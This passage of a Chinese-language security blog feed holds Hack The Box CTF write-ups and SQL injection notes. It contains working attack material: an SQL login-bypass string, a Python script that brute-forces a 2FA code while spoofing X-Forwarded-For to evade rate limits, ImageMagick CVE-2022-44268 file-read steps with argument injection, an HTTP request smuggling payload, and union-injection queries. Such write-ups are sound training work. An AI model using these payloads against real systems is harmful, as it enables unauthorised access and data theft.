flag=Config.FLAG)<br></code></pre></td></tr></table></figure><p>查看<code>login.py</code>若用户成功登录将被重定向到<code>/auth/verify-2fa</code>若未成功，则回到<code>public/login.html</code></p><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>但在页面点击<code>login</code>返回报错403，对其路径进行模糊测试，发现<code>//auth/login</code>可以成功绕过</p><p>尝试使用万能密码绕过登录验证，结果成功了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">username<span class="hljs-operator">=</span>admin<span class="hljs-string">&#x27;+or+&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>password<span class="hljs-operator">=</span>password<br></code></pre></td></tr></table></figure><p>成功访问到 <code>/auth/verify-2fa</code> 页面，此处因为只有四位纯数字，于是尝试使用爆破，同时由于短时间内同一IP请求次数过多将被服务器阻止，这里通过修改<code>X-Forwarded-For</code>实现每五个请求更换一个IP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> concurrent. futures <span class="hljs-keyword">import</span> ThreadPoolExecutor<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_combinations_in_array</span>(<span class="hljs-params">path</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">return</span> f.read().splitlines()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_response</span>(<span class="hljs-params">response, combination</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Invalid 2FA Code!&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Try: <span class="hljs-subst">&#123;combination&#125;</span>\n&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;GOT IT!\n2FA Code: <span class="hljs-subst">&#123;combination&#125;</span>\n<span class="hljs-subst">&#123;response.text&#125;</span>\n&#x27;</span>)<br>        sys.exit()<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(response.text)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_request</span>(<span class="hljs-params">ip, combination, headers, url</span>):<br>    headers[<span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span>] = ip<br>    data = &#123;<span class="hljs-string">&#x27;2fa-code&#x27;</span>: <span class="hljs-built_in">str</span>(combination)&#125;<br><br>    response = requests.post(url, headers=headers, data=data)<br>    handle_response(response, combination)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_all_requests</span>(<span class="hljs-params">url, combinations_array</span>):<br>    base_ip = <span class="hljs-string">&#x27;192.168.&#x27;</span><br>    current_ip_suffix = [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>]<br>    headers = &#123;<br>        <span class="hljs-string">&#x27;Host&#x27;</span>: <span class="hljs-string">&#x27;83.136.249.173:34046&#x27;</span>,<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&#x27;en-US,en;q=0.5&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept-Encoding&#x27;</span>: <span class="hljs-string">&#x27;gzip, deflate&#x27;</span>,<br>        <span class="hljs-string">&#x27;Referer&#x27;</span>: <span class="hljs-string">&#x27;83.136.249.173:34046/auth/verify-2fa&#x27;</span>,<br>        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<br>        <span class="hljs-string">&#x27;Content-Length&#x27;</span>: <span class="hljs-string">&#x27;13&#x27;</span>,<br>        <span class="hljs-string">&#x27;Origin&#x27;</span>: <span class="hljs-string">&#x27;83.136.249.173:34046&#x27;</span>,<br>        <span class="hljs-string">&#x27;DNT&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,<br>        <span class="hljs-string">&#x27;Connection&#x27;</span>: <span class="hljs-string">&#x27;close&#x27;</span>,<br>        <span class="hljs-string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,<br>    &#125;<br><br>    <span class="hljs-comment"># Multi-threading requests sending (see python ThreadPoolExecutor lib for more informations)</span><br>    <span class="hljs-keyword">with</span> ThreadPoolExecutor(max_workers=<span class="hljs-number">100</span>) <span class="hljs-keyword">as</span> executor:<br>        futures = []<br><br>        <span class="hljs-keyword">for</span> i, combination <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(combinations_array, start=<span class="hljs-number">1</span>):<br>            ip = base_ip + <span class="hljs-built_in">str</span>(current_ip_suffix[<span class="hljs-number">0</span>]) + <span class="hljs-string">&#x27;.&#x27;</span> + <span class="hljs-built_in">str</span>(current_ip_suffix[<span class="hljs-number">1</span>])<br><br>            future = executor.submit(send_request, ip, combination, headers, url)<br>            futures.append(future)<br><br>            <span class="hljs-keyword">if</span> i % <span class="hljs-number">5</span> == <span class="hljs-number">0</span>:<br>                current_ip_suffix[<span class="hljs-number">1</span>] += <span class="hljs-number">1</span><br><br>            <span class="hljs-keyword">if</span> current_ip_suffix[<span class="hljs-number">1</span>] &gt; <span class="hljs-number">254</span>:<br>                current_ip_suffix[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span><br>                current_ip_suffix[<span class="hljs-number">0</span>] += <span class="hljs-number">1</span><br><br>            <span class="hljs-keyword">if</span> current_ip_suffix[<span class="hljs-number">0</span>] &gt; <span class="hljs-number">254</span>:<br>                current_ip_suffix = [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>]<br><br>            <span class="hljs-keyword">for</span> future <span class="hljs-keyword">in</span> futures:<br>                future.result()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    combinations_path = <span class="hljs-string">&#x27;4-digit-wordlist.txt&#x27;</span><br>    url =<span class="hljs-string">&#x27;http://83.136.249.173:34046/auth/verify-2fa&#x27;</span><br><br>    combinations_array = get_combinations_in_array(combinations_path)<br>    send_all_requests(url, combinations_array)<br></code></pre></td></tr></table></figure><p>Flag：HTB{1_l0v3_h4pr0x1_4cl5_4nd_4ll_1t5_f34tur35}</p>]]></content>
    
    
    <categories>
      
      <category>HackThebox</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTB</tag>
      
      <tag>SQL注入</tag>
      
      <tag>暴力破解</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB_PryingEyes</title>
    <link href="/2024/05/27/htb-PryingEyes/"/>
    <url>/2024/05/27/htb-PryingEyes/</url>
    
    <content type="html"><![CDATA[<h1 id="PryingEyes"><a href="#PryingEyes" class="headerlink" title="PryingEyes"></a>PryingEyes</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Welcome to the Prying Eyes, a “safe space” for those curious about the large organisations that dominate our life. How safe is the site really?</p><p>欢迎来到窥探之眼，这是一个“安全空间”，适合那些对主宰我们生活的大型组织感到好奇的人。该网站到底有多安全？</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>打开题目网站，点击相关功能，发现可以进行注册，帖子内容没有什么特别的，于是下载源码进行审计</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs js"># /routes/forum.<span class="hljs-property">js</span><br><span class="hljs-title class_">ValidationMiddleware</span>(<span class="hljs-string">&quot;post&quot;</span>, <span class="hljs-string">&quot;/forum&quot;</span>),<br>  <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>    <span class="hljs-keyword">const</span> &#123; title, message, parentId, ...convertParams &#125; = req.<span class="hljs-property">body</span>;<br>    <span class="hljs-keyword">if</span> (parentId) &#123;<br>      <span class="hljs-keyword">const</span> parentPost = <span class="hljs-keyword">await</span> db.<span class="hljs-title function_">getPost</span>(parentId);<br><br>      <span class="hljs-keyword">if</span> (!parentPost) &#123;<br>        req.<span class="hljs-title function_">flashError</span>(<span class="hljs-string">&quot;That post doesn&#x27;t seem to exist.&quot;</span>);<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&quot;/forum&quot;</span>);<br>      &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">let</span> attachedImage = <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-keyword">if</span> (req.<span class="hljs-property">files</span> &amp;&amp; req.<span class="hljs-property">files</span>.<span class="hljs-property">image</span>) &#123;<br>      <span class="hljs-keyword">const</span> fileName = <span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&quot;hex&quot;</span>);<br>      <span class="hljs-keyword">const</span> filePath = path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&quot;..&quot;</span>, <span class="hljs-string">&quot;uploads&quot;</span>, fileName);<br><br>      <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">const</span> processedImage = <span class="hljs-keyword">await</span> <span class="hljs-title function_">convert</span>(&#123;<br>          ...convertParams,<br>          <span class="hljs-attr">srcData</span>: req.<span class="hljs-property">files</span>.<span class="hljs-property">image</span>.<span class="hljs-property">data</span>,<br>          <span class="hljs-attr">format</span>: <span class="hljs-string">&quot;AVIF&quot;</span>,<br>        &#125;);<br><br>        <span class="hljs-keyword">await</span> fs.<span class="hljs-title function_">writeFile</span>(filePath, processedImage);<br><br>        attachedImage = <span class="hljs-string">`/uploads/<span class="hljs-subst">$&#123;fileName&#125;</span>`</span>;<br>      &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>        req.<span class="hljs-title function_">flashError</span>(<span class="hljs-string">&quot;There was an issue processing your image, please try again.&quot;</span>);<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&quot;Error occured while processing image:&quot;</span>, error);<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&quot;/forum&quot;</span>);<br>      &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">const</span> &#123; <span class="hljs-attr">lastID</span>: postId &#125; = <span class="hljs-keyword">await</span> db.<span class="hljs-title function_">createPost</span>(req.<span class="hljs-property">session</span>.<span class="hljs-property">userId</span>, parentId, title, message, attachedImage);<br><br>    <span class="hljs-keyword">if</span> (parentId) &#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">`/forum/post/<span class="hljs-subst">$&#123;parentId&#125;</span>#post-<span class="hljs-subst">$&#123;postId&#125;</span>`</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">`/forum/post/<span class="hljs-subst">$&#123;postId&#125;</span>`</span>);<br>    &#125;<br>  &#125;<br>);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-function">(<span class="hljs-params">database</span>) =&gt;</span> &#123;<br>  db = database;<br>  <span class="hljs-keyword">return</span> router;<br>&#125;;<br></code></pre></td></tr></table></figure><p> 在<code>forum.js</code>代码中可见，除了<code>title</code>、<code>message</code>、<code>parentld</code>这三个参数以外，其他参数都写在<code>convertParams</code>中</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> processedImage = <span class="hljs-keyword">await</span> convert<br></code></pre></td></tr></table></figure><p>使用了<code>convert</code>对图片进行了一个转换，而这个convert存在于<a href="https://www.npmjs.com/package/imagemagick-convert"><code>imagemagick-convert</code></a></p><p>而<code>imagemagick</code>存在的漏洞：<strong>CVE-2022-44268任意文件读取漏洞</strong></p><p>CVE-2022-44268：ImageMagick 7.1.0-49 存在信息泄露漏洞。当它解析 PNG 图像（例如，调整大小）时，生成的图像可能嵌入任意远程文件的内容（如果 ImageMagick 二进制文件有读取权限）</p><p>然后这个漏洞只有在转PNG文件时才会存在，但从代码中可知输出的图片类型为AVIF</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<br>        <span class="hljs-keyword">const</span> processedImage = <span class="hljs-keyword">await</span> <span class="hljs-title function_">convert</span>(&#123;<br>          ...convertParams,<br>          <span class="hljs-attr">srcData</span>: req.<span class="hljs-property">files</span>.<span class="hljs-property">image</span>.<span class="hljs-property">data</span>,<br>          <span class="hljs-attr">format</span>: <span class="hljs-string">&quot;AVIF&quot;</span>,<br>        &#125;);<br></code></pre></td></tr></table></figure><p>这里采用imagemagick-convert的参数注入，上传过程中抓包修改其中参数内容，将<code>-write filename</code>写入其中并上传，从而成功利用</p><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ol><li><p>利用<a href="https://github.com/vulhub/vulhub/blob/master/imagemagick/CVE-2022-44268/poc.py">github开源的poc</a>构造恶意图片，命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python CVE-2022-44268-poc.py generate -o poc.png -r flag.txt<br></code></pre></td></tr></table></figure></li><li><p>在评论出选择生成的poc.png进行上传，上传过程中手动抓包添加：</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs fortran">Conten-Disposition: <span class="hljs-keyword">form</span>-<span class="hljs-keyword">data</span>; <span class="hljs-keyword">name</span>=<span class="hljs-string">&quot;background&quot;</span><br><br>blue -<span class="hljs-built_in">write</span> ./uploads/<span class="hljs-built_in">exp</span>.png<br></code></pre></td></tr></table></figure><p><img src="/img/htb_pryingeyes_3.png" alt="htb_pryingeyes_3"></p></li><li><p>访问&#x2F;uploads&#x2F;exp.png并下载写入的图片</p></li><li><p>将其后缀修改为.png使用之前github下载的poc读取带出来的文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python CVE-2022-44268-poc.py generate -o poc.png -r flag.txt<br></code></pre></td></tr></table></figure><p><img src="/img/htb_pryingeyes_2.png" alt="htb_pryingeyes_2"></p></li><li><p>将得到内容HEX转ASCII，成功得到flag</p><p><img src="/img/htb_pryingeyes_1.png" alt="htb_pryingeyes_1"></p></li></ol><p>Flag：HTB{Im4g3m4g1ck_vU1n5_5tR1k3_4g4in}</p>]]></content>
    
    
    <categories>
      
      <category>HackThebox</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTB</tag>
      
      <tag>CVE</tag>
      
      <tag>任意文件读取</tag>
      
      <tag>参数注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB_ApacheBlaze</title>
    <link href="/2024/05/27/htb-apacheblaze/"/>
    <url>/2024/05/27/htb-apacheblaze/</url>
    
    <content type="html"><![CDATA[<h1 id="ApacheBlaze"><a href="#ApacheBlaze" class="headerlink" title="ApacheBlaze"></a>ApacheBlaze</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Step into the ApacheBlaze universe, a world of arcade clicky games. Rumor has it that by playing certain games, you have the chance to win a grand prize. However, before you can dive into the fun, you’ll need to crack a puzzle.</p><p>走进 ApacheBlaze 宇宙，这是一个充满街机点击游戏的世界。有传言说，通过玩某些游戏，您有机会赢得大奖。然而，在享受乐趣之前，您需要破解一个谜题。</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>打开题目网址，可以看到有4个Game，但点击Game1~Game3都只会提示：</p><p><em><strong>This game is currently unavailable due to internal maintenance.</strong></em></p><p>而点击Game4则会提示</p><p><strong>This game is currently available only from dev.apacheblaze.local.</strong></p><p>此处猜测题目的考点可能在请求伪造</p><p>下载题目源码进行分析</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># backend/src/app.py</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, jsonify<br><br>app = Flask(__name__)<br><br>app.config[<span class="hljs-string">&#x27;GAMES&#x27;</span>] = &#123;<span class="hljs-string">&#x27;magic_click&#x27;</span>, <span class="hljs-string">&#x27;click_mania&#x27;</span>, <span class="hljs-string">&#x27;hyper_clicker&#x27;</span>, <span class="hljs-string">&#x27;click_topia&#x27;</span>&#125;<br>app.config[<span class="hljs-string">&#x27;FLAG&#x27;</span>] = <span class="hljs-string">&#x27;HTB&#123;f4k3_fl4g_f0r_t3st1ng&#125;&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    game = request.args.get(<span class="hljs-string">&#x27;game&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> game:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<br>            <span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;Empty game name is not supported!.&#x27;</span><br>        &#125;), <span class="hljs-number">400</span><br><br>    <span class="hljs-keyword">elif</span> game <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> app.config[<span class="hljs-string">&#x27;GAMES&#x27;</span>]:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<br>            <span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;Invalid game name!&#x27;</span><br>        &#125;), <span class="hljs-number">400</span><br><br>    <span class="hljs-keyword">elif</span> game == <span class="hljs-string">&#x27;click_topia&#x27;</span>:<br>        <span class="hljs-keyword">if</span> request.headers.get(<span class="hljs-string">&#x27;X-Forwarded-Host&#x27;</span>) == <span class="hljs-string">&#x27;dev.apacheblaze.local&#x27;</span>:<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<br>                <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;app.config[<span class="hljs-string">&quot;FLAG&quot;</span>]&#125;</span>&#x27;</span><br>            &#125;), <span class="hljs-number">200</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<br>                <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;This game is currently available only from dev.apacheblaze.local.&#x27;</span><br>            &#125;), <span class="hljs-number">200</span><br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<br>            <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;This game is currently unavailable due to internal maintenance.&#x27;</span><br>        &#125;), <span class="hljs-number">200</span><br><br></code></pre></td></tr></table></figure><p>从此代码不难看出，通过选择<code>Game4</code>并提供固定的<code>X-Forwarded-Host</code>即可得到flag</p><p>但经过抓包修改测试，这样并不能得到flag</p><p>而原因是<code>X-Forwarded-Host</code>不仅存在<code>dev.apacheblaze.local</code>还存在有其他的元素</p><p>通过Apache的文档，我们可以知道这种情况的原因：</p><figure class="highlight tp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs tp">当以反向代理模式运行时（例如，使用 ProxyPass 指令），mod_proxy_http 会添加多个请求标头，以便将信息传递到原始服务器。这些标头是：<br><br><span class="hljs-keyword">X</span>-Forwarded-For<br>    客户端的 IP 地址。<br><span class="hljs-keyword">X</span>-Forwarded-Host<br>    客户端在 Host HTTP 请求标头中请求的原始主机。<br><span class="hljs-keyword">X</span>-Forwarded-Server<br>    代理服务器的主机名。<br></code></pre></td></tr></table></figure><p>因此，我们需要考虑如何仅在<code>X-Forwarded-Host</code>设置一个正确的元素</p><p>这里利用漏洞：<strong>HTTP 请求走私攻击 (CVE-2023–25690)</strong></p><p>通过此漏洞，我们可以在发送给目标服务器的第一个请求中去隐藏第二个请求，而这样可以使得我们的第二个请求直接从反向代理发送，因此不会添加其他内容在<code>X-Forwarded-Host</code></p><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>综上所述，尝试构造Payload：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">/api/games/click_topia<span class="hljs-meta">%</span><span class="hljs-number">20</span>HTTP/<span class="hljs-number">1.1</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>d<span class="hljs-meta">%</span><span class="hljs-number">0</span>aHost:<span class="hljs-meta">%</span><span class="hljs-number">20</span>dev.apacheblaze.local<span class="hljs-meta">%</span><span class="hljs-number">0</span>d<span class="hljs-meta">%</span><span class="hljs-number">0</span>a<span class="hljs-meta">%</span><span class="hljs-number">0</span>d<span class="hljs-meta">%</span><span class="hljs-number">0</span>a<br></code></pre></td></tr></table></figure><p><img src="/img/HTB_ApacheBlaze_1.png"></p><p>Flag：HTB{1t5_4ll_4b0ut_Th3_Cl1ck5}</p>]]></content>
    
    
    <categories>
      
      <category>HackThebox</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTB</tag>
      
      <tag>请求走私</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Web学习笔记</title>
    <link href="/2023/06/02/web1/"/>
    <url>/2023/06/02/web1/</url>
    
    <content type="html"><![CDATA[<h1 id="Web基础漏洞"><a href="#Web基础漏洞" class="headerlink" title="Web基础漏洞"></a>Web基础漏洞</h1><h2 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h2><h3 id="什么是-Sql-注入"><a href="#什么是-Sql-注入" class="headerlink" title="什么是 Sql 注入"></a>什么是 Sql 注入</h3><p>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息</p><p><strong>注意！！！下面的注入示例以sql-labs为例</strong></p><h3 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h3><p>SQL语句的union联合注入的常用格式如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> table_name1 <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span> <span class="hljs-keyword">from</span> table_name2;<br></code></pre></td></tr></table></figure><p>而在注入过程中，我们把union select 4,5,6 from table_name2部分称作是union注入部分，它的主要特点是通过union和前面一条SQL语句拼接，并构造其列数与前面的SQL语句列数相同，如1,2,3&#x3D;&#x3D;4,5,6均为3列。我们把这种注入方式称为union注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>判断列数<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 3 --+</span><br><span class="hljs-string"></span><br><span class="hljs-string">//判断回显点</span><br><span class="hljs-string">-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-comment">--+</span><br><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>尝试利用回显点进行查询<br><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,database(),version() --+</span><br><span class="hljs-string"></span><br><span class="hljs-string">//获取所有数据库的名称</span><br><span class="hljs-string">-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span><br><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>获取数据库<span class="hljs-string">&#x27;security&#x27;</span>中的所有表名<br><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="hljs-string">&#x27;),3 